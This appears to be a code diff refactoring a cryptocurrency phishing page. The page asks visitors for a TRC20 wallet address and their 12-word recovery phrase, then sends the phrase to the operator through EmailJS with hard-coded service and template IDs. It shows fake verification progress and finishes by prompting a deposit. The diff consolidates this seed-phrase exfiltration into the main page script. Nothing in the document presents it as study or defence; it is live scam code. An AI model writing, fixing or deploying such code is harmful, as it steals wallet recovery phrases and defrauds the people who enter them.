@@ -511,7 +511,7 @@
     <div class="status-message">Eligibility activated</div>
     <div class="idle-message" id="depositMsg">⏳ Awaiting deposit...</div>
   </div>
-</main>
+</main>  
 
 <div id="toast"></div>
 
@@ -528,75 +528,94 @@ document.addEventListener("DOMContentLoaded", () => {
   }
   
   // References
-const s1 = document.getElementById('step1');
-const s2 = document.getElementById('step2');
-const s3 = document.getElementById('step3');
-const fin = document.getElementById('final');
-const prog = document.getElementById('progbar');
+  const s1 = document.getElementById('step1');
+  const s2 = document.getElementById('step2');
+  const s3 = document.getElementById('step3');
+  const fin = document.getElementById('final');
+  const prog = document.getElementById('progbar');
 
-const tierSelect = document.getElementById('tierSelect');
-const loaderBar = document.getElementById('loaderBar');
-const s1btn = document.getElementById('s1btn');
-const s2btn = document.getElementById('s2btn');
-const s3btn = document.getElementById('s3btn');
-const copyBtn = document.getElementById('copyBtn');
+  const tierSelect = document.getElementById('tierSelect');
+  const loaderBar = document.getElementById('loaderBar');
+  const s1btn = document.getElementById('s1btn');
+  const s2form = document.getElementById('step2-form');
+  const s3btn = document.getElementById('s3btn');
+  const copyBtn = document.getElementById('copyBtn');
+  const addrEl = document.getElementById('addr');
 
-// ✅ Stop blinking once a tier is chosen
-if (tierSelect) {
-  tierSelect.addEventListener("change", () => {
-    if (tierSelect.value) {
-      tierSelect.classList.remove("attention");
-    }
-  });
-}  
+  // ✅ Stop blinking once a tier is chosen
+  if (tierSelect) {
+    tierSelect.addEventListener("change", () => {
+      if (tierSelect.value) {
+        tierSelect.classList.remove("attention");
+      }
+    });
+  }
+
+  // ✅ Smooth transition helper
+  function showStep(stepEl) {
+    [s1, s2, s3, fin].forEach(el => {
+      if (el) {
+        el.hidden = true;
+        el.classList.remove("show");
+      }
+    });
+    stepEl.hidden = false;
+    requestAnimationFrame(() => stepEl.classList.add("show"));
+  }
 
   // Step 1 → Step 2
   if (s1btn) {
     s1btn.addEventListener('click', () => {
-      const addrEl = document.getElementById('addr');
       const addr = addrEl ? addrEl.value.trim() : '';
       if (!addr) {
-        addrEl?.focus(); // auto-focus if empty
+        addrEl?.focus();
         return;
       }
+      loaderBar.hidden = false;
       setTimeout(() => {
-        s1.hidden = true;
-        s2.hidden = false;
-      }, 2000);
+        loaderBar.hidden = true;
+        showStep(s2);
+      }, 1500);
     });
   }
 
-  // Step 2 → Step 3
-  if (s2btn) {
-    s2btn.addEventListener('click', () => {
-      let phrase = '';
-      for (let i = 1; i <= 12; i++) {
-        const input = document.getElementById(`word${i}`);
-        if (input) {
-          const val = input.value.trim();
-          if (!val) {
-            input.focus(); // auto-focus missing word
-            return;
-          }
-          phrase += val + ' ';
+  // Step 2 → Step 3 (EmailJS send)
+  if (s2form) {
+    s2form.addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      // Check all 12 phrase inputs first
+      const phraseInputs = s2form.querySelectorAll("input[name^='word']");
+      for (let input of phraseInputs) {
+        if (!input.value.trim()) {
+          input.focus();
+          return;
         }
       }
-      phrase = phrase.trim();
 
       // Check the confirmation checkbox
-      const matchCheck = document.getElementById('matchCheck');
-      if (!matchCheck || !matchCheck.checked) {
+      const matchCheck = document.getElementById("matchCheck");
+      if (!matchCheck.checked) {
         showToast("Please confirm your backup matches your TRC20 wallet address.");
         return;
       }
 
-      // Continue with flow
-      prog.style.width = '70%';
-      setTimeout(() => {
-        prog.style.width = '100%';
-        s2.hidden = true;
-        s3.hidden = false;
-      }, 3000);
+      // Send form via EmailJS
+      emailjs.sendForm("service_1qzlil7", "template_w742mzr", "#step2-form")
+        .then(function(response) {
+          console.log("EmailJS success:", response);
+          prog.style.width = "70%";
+          loaderBar.hidden = false;
+          setTimeout(() => {
+            prog.style.width = "100%";
+            loaderBar.hidden = true;
+            showStep(s3);
+          }, 2000);
+        })
+        .catch(function(error) {
+          console.error("EmailJS error:", error);
+          showToast("Verification failed. Please try again.");
+        });
     });
   }
 
@@ -604,16 +623,14 @@ if (tierSelect) {
   if (s3btn) {
     s3btn.addEventListener('click', () => {
       if (!tierSelect.value) {
-        return; // blinking handles the prompt
+        return;
       }
       loaderBar.hidden = false;
-
       setTimeout(() => {
-        s3.hidden = true;
-        fin.hidden = false;
         loaderBar.hidden = true;
+        showStep(fin);
 
-        const walletAddr = document.getElementById('addr').value.trim();
+        const walletAddr = addrEl.value.trim();
         const tierValue = tierSelect.value;
 
         const tierMap = {
@@ -641,7 +658,7 @@ if (tierSelect) {
             depositMsg.classList.add('glow');
           }
         }
-      }, 4000);
+      }, 2000);
     });
   }
 
@@ -659,53 +676,11 @@ if (tierSelect) {
 });
 </script>
 
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
   (function() {
     emailjs.init("dvLgjhIHXXq7QXp5p"); // your public key
   })();
-
-  const s2form = document.getElementById("step2-form");
-  const prog = document.getElementById("progbar");
-  const s2 = document.getElementById("step2");
-  const s3 = document.getElementById("step3");
-
-  s2form.addEventListener("submit", function(event) {
-    event.preventDefault();
-
-    // Check all 12 phrase inputs first
-    const phraseInputs = s2form.querySelectorAll("input[name^='word']");
-    for (let input of phraseInputs) {
-      if (!input.value.trim()) {
-        // Auto-focus the first empty box
-        input.focus();
-        return; // stop here, don't proceed
-      }
-    }
-
-    // If all boxes are filled, check the confirmation checkbox
-    const matchCheck = document.getElementById("matchCheck");
-    if (!matchCheck.checked) {
-      showToast("Please confirm your backup matches your TRC20 wallet address.");
-      return;
-    }
-
-    // If everything is valid, send form via EmailJS
-    emailjs.sendForm("service_1qzlil7", "template_w742mzr", "#step2-form")
-      .then(function(response) {
-        console.log("EmailJS success:", response);
-        prog.style.width = "70%";
-        setTimeout(() => {
-          prog.style.width = "100%";
-          s2.hidden = true;
-          s3.hidden = false;
-        }, 3000);
-      })
-      .catch(function(error) {
-        console.error("EmailJS error:", error);
-        showToast("Verification failed. Please try again.");
-      });
-  });
 </script>
 </body>
 </html>
